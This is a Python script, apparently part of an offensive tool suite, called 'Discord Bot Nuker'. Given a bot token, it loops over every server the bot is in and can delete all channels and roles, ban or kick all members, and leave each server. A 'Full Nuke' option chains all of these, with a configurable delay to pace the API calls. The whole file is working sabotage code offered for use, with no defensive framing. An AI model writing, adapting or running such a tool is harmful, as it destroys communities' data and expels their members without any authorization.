# Copyright (c) 2026 v4lkyr0
# See LICENSE file for details

from Plugins.Utils import *
from Plugins.Config import *

try:
    import requests
    import time
except Exception as e:
    MissingModule(e)

Title("Discord Bot Nuker")
Connection()
CheckGithubStar()

try:
    bot_token = ChoiceBot()
    
    Scroll(f"""
 {PREFIX}01{SUFFIX} Delete All Channels
 {PREFIX}02{SUFFIX} Ban All Members
 {PREFIX}03{SUFFIX} Kick All Members
 {PREFIX}04{SUFFIX} Delete All Roles
 {PREFIX}05{SUFFIX} Leave All Servers
 {PREFIX}06{SUFFIX} Full Nuke
""")
    
    choice = input(f"{INPUT} Choice {red}->{reset} ").strip().lstrip("0")
    if choice not in ["1", "2", "3", "4", "5", "6"]:
        ErrorChoice()
    
    delay = input(f"{INPUT} Delay Between Actions {red}->{reset} ").strip()
    try:
        delay = float(delay)
        if delay < 0.1:
            delay = 0.1
    except:
        delay = 0.5
    
    headers = {"Authorization": f"Bot {bot_token}", "Content-Type": "application/json", "User-Agent": RandomUserAgents()}
    
    print(f"{LOADING} Fetching Bot Servers..", reset)
    guilds_response = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
    if guilds_response.status_code != 200:
        print(f"{ERROR} Failed to Fetch Servers: {guilds_response.status_code}", reset)
        Continue()
        Reset()
    
    guilds = guilds_response.json()
    if not guilds:
        print(f"{ERROR} Bot is Not in Any Servers", reset)
        Continue()
        Reset()
    
    print(f"{SUCCESS} Found {len(guilds)} Server(s)", reset)
    print()
    
    def DeleteChannels(guild_id, guild_name):
        try:
            channels_response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers)
            if channels_response.status_code != 200:
                print(f"{ERROR} Status:{red} Failed  {white}| Server:{red} {guild_name} {white}| Error:{red} Cannot Fetch Channels", reset)
                return
            
            channels = channels_response.json()
            print(f"{INFO} Deleting {len(channels)} Channel(s) in {guild_name}", reset)
            
            for channel in channels:
                try:
                    channel_id = channel["id"]
                    channel_name = channel.get("name", "Unknown")
                    response = requests.delete(f"https://discord.com/api/v9/channels/{channel_id}", headers=headers)
                    if response.status_code == 200:
                        print(f"{SUCCESS} Status:{red} Deleted {white}| Channel:{red} {channel_name} {white}| Server:{red} {guild_name}", reset)
                    else:
                        print(f"{ERROR} Status:{red} Failed  {white}| Channel:{red} {channel_name} {white}| Code:{red} {response.status_code}", reset)
                    time.sleep(delay)
                except Exception as e:
                    print(f"{ERROR} Status:{red} Error   {white}| Channel:{red} {channel.get('name', 'Unknown')} {white}| Error:{red} {e}", reset)
        except Exception as e:
            print(f"{ERROR} Status:{red} Error   {white}| Server:{red} {guild_name} {white}| Error:{red} {e}", reset)
    
    def BanMembers(guild_id, guild_name):
        try:
            members_response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", headers=headers)
            if members_response.status_code != 200:
                print(f"{ERROR} Status:{red} Failed  {white}| Server:{red} {guild_name} {white}| Error:{red} Cannot Fetch Members", reset)
                return
            
            members = members_response.json()
            print(f"{INFO} Banning {len(members)} Member(s) in {guild_name}", reset)
            
            for member in members:
                try:
                    user_id = member["user"]["id"]
                    username = member["user"].get("username", "Unknown")
                    response = requests.put(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{user_id}", headers=headers)
                    if response.status_code == 204:
                        print(f"{SUCCESS} Status:{red} Banned  {white}| User:{red} {username} {white}| Server:{red} {guild_name}", reset)
                    else:
                        print(f"{ERROR} Status:{red} Failed  {white}| User:{red} {username} {white}| Code:{red} {response.status_code}", reset)
                    time.sleep(delay)
                except Exception as e:
                    print(f"{ERROR} Status:{red} Error   {white}| User:{red} {member.get('user', {}).get('username', 'Unknown')} {white}| Error:{red} {e}", reset)
        except Exception as e:
            print(f"{ERROR} Status:{red} Error   {white}| Server:{red} {guild_name} {white}| Error:{red} {e}", reset)
    
    def KickMembers(guild_id, guild_name):
        try:
            members_response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", headers=headers)
            if members_response.status_code != 200:
                print(f"{ERROR} Status:{red} Failed  {white}| Server:{red} {guild_name} {white}| Error:{red} Cannot Fetch Members", reset)
                return
            
            members = members_response.json()
            print(f"{INFO} Kicking {len(members)} Member(s) in {guild_name}", reset)
            
            for member in members:
                try:
                    user_id = member["user"]["id"]
                    username = member["user"].get("username", "Unknown")
                    response = requests.delete(f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}", headers=headers)
                    if response.status_code == 204:
                        print(f"{SUCCESS} Status:{red} Kicked  {white}| User:{red} {username} {white}| Server:{red} {guild_name}", reset)
                    else:
                        print(f"{ERROR} Status:{red} Failed  {white}| User:{red} {username} {white}| Code:{red} {response.status_code}", reset)
                    time.sleep(delay)
                except Exception as e:
                    print(f"{ERROR} Status:{red} Error   {white}| User:{red} {member.get('user', {}).get('username', 'Unknown')} {white}| Error:{red} {e}", reset)
        except Exception as e:
            print(f"{ERROR} Status:{red} Error   {white}| Server:{red} {guild_name} {white}| Error:{red} {e}", reset)
    
    def DeleteRoles(guild_id, guild_name):
        try:
            roles_response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers)
            if roles_response.status_code != 200:
                print(f"{ERROR} Status:{red} Failed  {white}| Server:{red} {guild_name} {white}| Error:{red} Cannot Fetch Roles", reset)
                return
            
            roles = roles_response.json()
            print(f"{INFO} Deleting {len(roles)} Role(s) in {guild_name}", reset)
            
            for role in roles:
                try:
                    role_id = role["id"]
                    role_name = role.get("name", "Unknown")
                    if role.get("managed") or role_name == "@everyone":
                        continue
                    response = requests.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}", headers=headers)
                    if response.status_code == 204:
                        print(f"{SUCCESS} Status:{red} Deleted {white}| Role:{red} {role_name} {white}| Server:{red} {guild_name}", reset)
                    else:
                        print(f"{ERROR} Status:{red} Failed  {white}| Role:{red} {role_name} {white}| Code:{red} {response.status_code}", reset)
                    time.sleep(delay)
                except Exception as e:
                    print(f"{ERROR} Status:{red} Error   {white}| Role:{red} {role.get('name', 'Unknown')} {white}| Error:{red} {e}", reset)
        except Exception as e:
            print(f"{ERROR} Status:{red} Error   {white}| Server:{red} {guild_name} {white}| Error:{red} {e}", reset)
    
    def LeaveServer(guild_id, guild_name):
        try:
            response = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild_id}", headers=headers)
            if response.status_code == 204:
                print(f"{SUCCESS} Status:{red} Left    {white}| Server:{red} {guild_name}", reset)
            else:
                print(f"{ERROR} Status:{red} Failed  {white}| Server:{red} {guild_name} {white}| Code:{red} {response.status_code}", reset)
        except Exception as e:
            print(f"{ERROR} Status:{red} Error   {white}| Server:{red} {guild_name} {white}| Error:{red} {e}", reset)
    
    for guild in guilds:
        guild_id = guild["id"]
        guild_name = guild.get("name", "Unknown Server")
        
        print(f"{INFO} Processing Server: {guild_name}", reset)
        
        if choice == "1":
            DeleteChannels(guild_id, guild_name)
        elif choice == "2":
            BanMembers(guild_id, guild_name)
        elif choice == "3":
            KickMembers(guild_id, guild_name)
        elif choice == "4":
            DeleteRoles(guild_id, guild_name)
        elif choice == "5":
            LeaveServer(guild_id, guild_name)
        elif choice == "6":
            DeleteChannels(guild_id, guild_name)
            time.sleep(delay)
            DeleteRoles(guild_id, guild_name)
            time.sleep(delay)
            BanMembers(guild_id, guild_name)
            time.sleep(delay)
            LeaveServer(guild_id, guild_name)
        
        print()
    
    print(f"{SUCCESS} Bot Nuking Completed", reset)
    Continue()
    Reset()
except Exception as e:
    Error(e)